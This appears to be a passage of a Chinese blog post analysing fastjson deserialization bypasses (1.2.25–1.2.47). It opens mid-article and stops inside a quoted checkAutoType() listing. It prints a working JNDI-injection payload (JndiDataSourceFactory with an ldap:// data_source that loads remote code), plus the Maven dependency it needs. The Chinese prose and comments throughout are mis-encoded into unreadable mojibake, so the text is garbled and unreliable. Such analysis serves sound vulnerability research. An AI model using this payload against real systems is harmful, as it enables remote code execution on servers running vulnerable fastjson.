<p>åœ¨æ­¤ç‰ˆæœ¬çˆ†å‡ºäº†ä¸€ä¸ªé»‘åå•ç»•è¿‡ï¼Œå®é™…ä¸Šï¼Œé»‘åå•æ˜¯æ— ç©·æ— å°½çš„ï¼Œéšç€ <code>fastjson</code> çš„ç‰ˆæœ¬æ›´æ–°ï¼Œä¸€å®šä¼šæœ‰æ›´å¤šçš„é»‘åå•çˆ†å‡ºæ¥ï¼Œå› ä¸ºéš”å£ <code>jackson</code> éƒ½æ˜¯æ˜æ–‡é»‘åå•çš„ï¼Œåªè¦éš”å£ä¸€æ›´æ–°ï¼Œå¤§å®¶éƒ½çœ‹åˆ°äº†ï¼Œå°±ä¼šæ‹¿æ¥çœ‹ <code>fastjson</code>ã€‚</p>
<blockquote>
<p>å½±å“ç‰ˆæœ¬ï¼š1.2.25 &lt;= fastjson &lt;= 1.2.45
æè¿°ï¼šé»‘åå•åˆ—è¡¨éœ€è¦ä¸æ–­è¡¥å……ã€‚</p>
</blockquote>
<p><code>payload</code>å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&#34;@type&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&#34;properties&#34;</span>:{
</span></span><span style="display:flex;"><span>        <span style="font-weight:bold">&#34;data_source&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;ldap://127.0.0.1:23457/Command8&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>éœ€è¦<code>pom</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;groupId&gt;</span>org.apache.ibatis<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;artifactId&gt;</span>ibatis-core<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;version&gt;</span>3.0<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="fastjson-1247">fastjson-1.2.47<a hidden class="anchor" aria-hidden="true" href="#fastjson-1247">#</a></h3>
<p>åœ¨ <code>fastjson</code> ä¸æ–­è¿­ä»£åˆ° <code>1.2.47</code> æ—¶ï¼Œçˆ†å‡ºäº†æœ€ä¸ºä¸¥é‡çš„æ¼æ´ï¼Œå¯ä»¥åœ¨ä¸å¼€å¯ <code>AutoTypeSupport</code> çš„æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–çš„åˆ©ç”¨ã€‚</p>
<blockquote>
<p>å½±å“ç‰ˆæœ¬ï¼š1.2.25 &lt;= fastjson &lt;= 1.2.32 æœªå¼€å¯ AutoTypeSupport
å½±å“ç‰ˆæœ¬ï¼š1.2.33 &lt;= fastjson &lt;= 1.2.47ä¸è®ºæ˜¯å¦å¼€å¯AutoTypeSupport
æè¿°ï¼šä½œè€…åˆ é™¤äº†ä¸€ä¸ª fastjson çš„æµ‹è¯•æ–‡ä»¶ï¼šhttps://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66 ï¼Œé‡Œé¢åŒ…å«äº†è¿™æ¬¡é€šæ€æ¼æ´çš„ payloadã€‚</p>
</blockquote>
<h4 id="åˆ†æ">åˆ†æ<a hidden class="anchor" aria-hidden="true" href="#åˆ†æ">#</a></h4>
<p>è¿™æ¬¡çš„ç»•è¿‡é—®é¢˜è¿˜æ˜¯å‡ºç°åœ¨ <code>checkAutoType()</code> æ–¹æ³•ä¸­ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">102
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">103
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">104
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">105
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">106
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">107
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">108
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">109
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">110
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">111
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">112
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">113
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">114
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">115
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">116
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">117
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">118
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">119
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">120
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">121
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">122
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">123
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">124
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">125
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">126
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">127
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">128
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">129
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">130
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">131
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">132
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">133
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">134
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">135
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">136
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">137
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">138
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">139
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">140
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span style="color:#fff;font-weight:bold">int</span> features) {
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ç±»åéç©ºåˆ¤æ–­
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (typeName == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ç±»åé•¿åº¦åˆ¤æ–­ï¼Œä¸å¤§äº128ä¸å°äº3
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (typeName.<span style="color:#007f7f">length</span>() &gt;= <span style="color:#ff0;font-weight:bold">128</span> || typeName.<span style="color:#007f7f">length</span>() &lt; <span style="color:#ff0;font-weight:bold">3</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        String className = typeName.<span style="color:#007f7f">replace</span>(<span style="color:#0ff;font-weight:bold">&#39;$&#39;</span>, <span style="color:#0ff;font-weight:bold">&#39;.&#39;</span>);
</span></span><span style="display:flex;"><span>        Class&lt;?&gt; clazz = <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">long</span> BASIC = <span style="color:#ff0;font-weight:bold">0xcbf29ce484222325L</span>; <span style="color:#007f7f">//;
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">long</span> PRIME = <span style="color:#ff0;font-weight:bold">0x100000001b3L</span>;  <span style="color:#007f7f">//L
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">long</span> h1 = (BASIC ^ className.<span style="color:#007f7f">charAt</span>(<span style="color:#ff0;font-weight:bold">0</span>)) * PRIME;
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ç±»åä»¥ [ å¼€å¤´æŠ›å‡ºå¼‚å¸¸
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (h1 == <span style="color:#ff0;font-weight:bold">0xaf64164c86024f1aL</span>) { <span style="color:#007f7f">// [
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>            <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ç±»åä»¥ L å¼€å¤´ä»¥ ; ç»“å°¾æŠ›å‡ºå¼‚å¸¸
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> ((h1 ^ className.<span style="color:#007f7f">charAt</span>(className.<span style="color:#007f7f">length</span>() - <span style="color:#ff0;font-weight:bold">1</span>)) * PRIME == <span style="color:#ff0;font-weight:bold">0x9198507b5af98f0L</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">throw</span> <span style="color:#fff;font-weight:bold">new</span> JSONException(<span style="color:#0ff;font-weight:bold">&#34;autoType is not support. &#34;</span> + typeName);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
